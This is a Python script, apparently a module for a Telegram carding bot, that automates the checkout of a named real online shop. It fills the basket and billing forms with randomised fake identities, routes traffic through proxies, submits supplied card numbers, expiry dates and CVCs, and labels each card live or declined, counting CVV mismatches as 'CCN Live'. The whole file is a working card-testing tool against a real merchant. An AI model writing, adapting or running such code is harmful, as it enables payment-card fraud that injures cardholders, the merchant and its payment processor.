"""
Adriana Gate Engine - Payflow AVS ($39.00 on shop.kingnut.com)
Direct headless ASP.NET cart checkout flow.
"""
import sys
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
import asyncio
import aiohttp
import time
import json
import random
import re
import urllib.parse

def _format_proxy(p):
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit():
            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

def _parse_between(text, start, end):
    try:
        s = text.split(start, 1)[1]
        return s.split(end, 1)[0]
    except Exception:
        return None

async def check_card_adr(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> tuple[bool, str, str, str]:
    """
    Adriana Gate: Payflow AVS on shop.kingnut.com
    Returns: (is_approved, status_str, response_str, raw_html)
    """
    proxy_url = _format_proxy(proxy_url)
    if len(yy) == 2:
        yy = "20" + yy
    mm = mm.zfill(2)
    
    card_type_map = {"4": "1", "5": "2", "6": "4", "3": "3"}
    card_type = card_type_map.get(cc[0], "1")
    
    first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Charles"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    firstname = random.choice(first_names)
    lastname = random.choice(last_names)
    email = f"{firstname.lower()}.{lastname.lower()}{random.randint(100,999)}@gmail.com"
    phone = f"206{random.randint(100,999)}{random.randint(1000,9999)}"
    street = f"{random.randint(100,9999)} Main St"
    city = "Seattle"
    zip_code = "98101"

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # 1. Get Product Page
            async with session.get("https://shop.kingnut.com/2LBS-Cajun-Party-Mix-2-lbs-P494.aspx", headers=headers, proxy=proxy_url) as r1:
                html1 = await r1.text()
                if r1.status != 200:
                    return False, "Error! ⚠️", f"Product page HTTP {r1.status}", ""

            vs1 = _parse_between(html1, 'id="__VIEWSTATE" value="', '"')
            vsg1 = _parse_between(html1, 'id="__VIEWSTATEGENERATOR" value="', '"')
            if not vs1 or not vsg1:
                return False, "Error! ⚠️", "Failed to parse product VIEWSTATE", ""

            # 2. Add to Basket
            post_headers = {
                **headers,
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://shop.kingnut.com',
                'Referer': 'https://shop.kingnut.com/2LBS-Cajun-Party-Mix-2-lbs-P494.aspx',
                'X-MicrosoftAjax': 'Delta=true',
                'X-Requested-With': 'XMLHttpRequest',
            }
            data_add = {
                'ctl00$ctl00$ScriptManager1': 'ctl00$ctl00$NestedMaster$PageContent$ctl00$BuyProductDialog1$BuyProductPanel|ctl00$ctl00$NestedMaster$PageContent$ctl00$BuyProductDialog1$AddToBasketButton',
                '__EVENTTARGET': '',
                '__EVENTARGUMENT': '',
                '__VIEWSTATE': vs1,
                '__VIEWSTATEGENERATOR': vsg1,
                '__VIEWSTATEENCRYPTED': '',
                'ctl00$ctl00$NestedMaster$PageContent$ctl00$BuyProductDialog1$Quantity': '1',
                'ctl00$ctl00$NestedMaster$PageContent$ctl00$BuyProductDialog1$AddToBasketButton': '+ Add to Cart',
                '__ASYNCPOST': 'true'
            }
            async with session.post("https://shop.kingnut.com/2LBS-Cajun-Party-Mix-2-lbs-P494.aspx", headers=post_headers, data=data_add, proxy=proxy_url) as r2:
                await r2.text()

            # 3. Get Basket
            async with session.get("https://shop.kingnut.com/Basket.aspx", headers=headers, proxy=proxy_url) as r3:
                html3 = await r3.text()
                if r3.status != 200:
                    return False, "Error! ⚠️", f"Basket page HTTP {r3.status}", ""

            vs3 = _parse_between(html3, 'id="__VIEWSTATE" value="', '"')
            vsg3 = _parse_between(html3, 'id="__VIEWSTATEGENERATOR" value="', '"')
            if not vs3 or not vsg3:
                return False, "Error! ⚠️", "Failed to parse basket VIEWSTATE", ""

            # 4. Proceed to Checkout
            data_basket = {
                'ctl00$ctl00$ScriptManager1': 'ctl00$ctl00$NestedMaster$PageContent$BasketPanel|ctl00$ctl00$NestedMaster$PageContent$CheckoutButton',
                '__EVENTTARGET': '',
                '__EVENTARGUMENT': '',
                '__VIEWSTATE': vs3,
                '__VIEWSTATEGENERATOR': vsg3,
                '__VIEWSTATEENCRYPTED': '',
                'ctl00$ctl00$NestedMaster$PageContent$CheckoutButton': 'Checkout >>',
                '__ASYNCPOST': 'true'
            }
            async with session.post("https://shop.kingnut.com/Basket.aspx", headers=post_headers, data=data_basket, proxy=proxy_url) as r4:
                await r4.text()

            # 5. Get Address Form
            async with session.get("https://shop.kingnut.com/Checkout/EditBillAddress.aspx", headers=headers, proxy=proxy_url) as r5:
                html5 = await r5.text()

            vs5 = _parse_between(html5, 'id="__VIEWSTATE" value="', '"')
            vsg5 = _parse_between(html5, 'id="__VIEWSTATEGENERATOR" value="', '"')
            if not vs5 or not vsg5:
                return False, "Error! ⚠️", "Failed to parse address VIEWSTATE", ""

            # 6. Post Billing Address
            data_addr = {
                '__EVENTTARGET': '',
                '__EVENTARGUMENT': '',
                '__VIEWSTATE': vs5,
                '__VIEWSTATEGENERATOR': vsg5,
                'ctl00$ctl00$NestedMaster$PageContent$UserName': email,
                'ctl00$ctl00$NestedMaster$PageContent$Password': 'P@ssw0rd9912',
                'ctl00$ctl00$NestedMaster$PageContent$ConfirmPassword': 'P@ssw0rd9912',
                'ctl00$ctl00$NestedMaster$PageContent$FirstName': firstname,
                'ctl00$ctl00$NestedMaster$PageContent$LastName': lastname,
                'ctl00$ctl00$NestedMaster$PageContent$Address1': street,
                'ctl00$ctl00$NestedMaster$PageContent$City': city,
                'ctl00$ctl00$NestedMaster$PageContent$Country': 'US',
                'ctl00$ctl00$NestedMaster$PageContent$Province2': 'WA',
                'ctl00$ctl00$NestedMaster$PageContent$PostalCode': zip_code,
                'ctl00$ctl00$NestedMaster$PageContent$Telephone': phone,
                'ctl00$ctl00$NestedMaster$PageContent$ShipToOption': 'SHIP_TO_BILLING_ADDRESS',
                'ctl00$ctl00$NestedMaster$PageContent$ShippingContinueButton': 'Continue Checkout >>',
            }
            form_headers = {
                **headers,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://shop.kingnut.com',
                'Referer': 'https://shop.kingnut.com/Checkout/EditBillAddress.aspx',
            }
            async with session.post("https://shop.kingnut.com/Checkout/EditBillAddress.aspx", headers=form_headers, data=data_addr, proxy=proxy_url) as r6:
                html6 = await r6.text()

            vs6 = _parse_between(html6, 'id="__VIEWSTATE" value="', '"')
            vsg6 = _parse_between(html6, 'id="__VIEWSTATEGENERATOR" value="', '"')

            # 7. Post Shipping Method
            data_ship = {
                '__EVENTTARGET': '',
                '__EVENTARGUMENT': '',
                '__VIEWSTATE': vs6 if vs6 else vs5,
                '__VIEWSTATEGENERATOR': vsg6 if vsg6 else vsg5,
                'ctl00$ctl00$NestedMaster$PageContent$ContinueButton': 'Continue >>',
                'ctl00$ctl00$NestedMaster$PageContent$ShipmentRepeater$ctl00$ShipMethodsList': '9',
            }
            async with session.post("https://shop.kingnut.com/Checkout/ShipMethod.aspx", headers=form_headers, data=data_ship, proxy=proxy_url) as r7:
                html7 = await r7.text()

            vs7 = _parse_between(html7, 'id="__VIEWSTATE" value="', '"')
            vsg7 = _parse_between(html7, 'id="__VIEWSTATEGENERATOR" value="', '"')

            # 8. Submit Payment
            data_pay = {
                'ctl00$ctl00$ScriptManager1': 'ctl00$ctl00$NestedMaster$PageContent$PaymentAjax|ctl00$ctl00$NestedMaster$PageContent$PaymentWidget$CreditCardPaymentForm$CreditCardButton',
                '__EVENTTARGET': '',
                '__EVENTARGUMENT': '',
                '__VIEWSTATE': vs7,
                '__VIEWSTATEGENERATOR': vsg7,
                'ctl00$ctl00$NestedMaster$PageContent$PaymentWidget$CreditCardPaymentForm$CardType': card_type,
                'ctl00$ctl00$NestedMaster$PageContent$PaymentWidget$CreditCardPaymentForm$CardName': f"{firstname} {lastname}",
                'ctl00$ctl00$NestedMaster$PageContent$PaymentWidget$CreditCardPaymentForm$CardNumber': cc,
                'ctl00$ctl00$NestedMaster$PageContent$PaymentWidget$CreditCardPaymentForm$ExpirationMonth': mm,
                'ctl00$ctl00$NestedMaster$PageContent$PaymentWidget$CreditCardPaymentForm$ExpirationYear': yy,
                'ctl00$ctl00$NestedMaster$PageContent$PaymentWidget$CreditCardPaymentForm$SecurityCode': cvc,
                'ctl00$ctl00$NestedMaster$PageContent$PaymentWidget$CreditCardPaymentForm$CreditCardButton': 'Processing...',
                '__ASYNCPOST': 'true'
            }
            pay_headers = {
                **headers,
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://shop.kingnut.com',
                'Referer': 'https://shop.kingnut.com/Checkout/Payment.aspx',
                'X-MicrosoftAjax': 'Delta=true',
                'X-Requested-With': 'XMLHttpRequest',
            }
            async with session.post("https://shop.kingnut.com/Checkout/Payment.aspx", headers=pay_headers, data=data_pay, proxy=proxy_url) as r8:
                resp_pay = await r8.text()

            # 9. Classify Payflow response
            mgs = _parse_between(resp_pay, '<div class="validationSummary">', '</div>')
            if mgs:
                mgs = re.sub(r'<[^>]+>', ' ', mgs).strip()
            
            if 'CVV2 Mismatch' in resp_pay or '15004' in resp_pay:
                return True, "APPROVED ✅", "CVV2 Mismatch: 15004 (AVS / CCN Live)", resp_pay[:300]
            elif 'Your order is confirmed' in resp_pay or 'Thank you for your order' in resp_pay:
                return True, "APPROVED ✅", "Charged ($39.00) Order Confirmed", resp_pay[:300]
            elif 'Incorrect credit card expiration date' in resp_pay:
                return False, "DECLINED ❌", "Incorrect Expiration Date", resp_pay[:300]
            elif 'Card Declined' in resp_pay:
                return False, "DECLINED ❌", "Card Declined by Issuer", resp_pay[:300]
            elif mgs:
                return False, "DECLINED ❌", mgs, resp_pay[:300]
            else:
                return False, "DECLINED ❌", "Payment Declined", resp_pay[:300]

    except Exception as e:
        return False, "ERROR ⚠️", str(e), ""

if __name__ == '__main__':
    test_card = sys.argv[1] if len(sys.argv) > 1 else "4833160315600632|09|2030|000"
    p = test_card.split('|')
    print(f"[*] Running Native Test of Adriana (/adr) Gate on: {test_card}")
    start = time.time()
    is_live, status, response, raw = asyncio.run(check_card_adr(p[0], p[1], p[2], p[3]))
    elapsed = round(time.time() - start, 2)
    
    print(f"""
=== TELEGRAM BOT OUTPUT (ADRIANA GATE) ===
Gate Charged: >_ Payflow AVS ($39.00)
----------------------------------------
Card: {test_card}
Status: {status}
Response: {response}
----------------------------------------
Time: {elapsed}s | Gateway: Adriana
""")
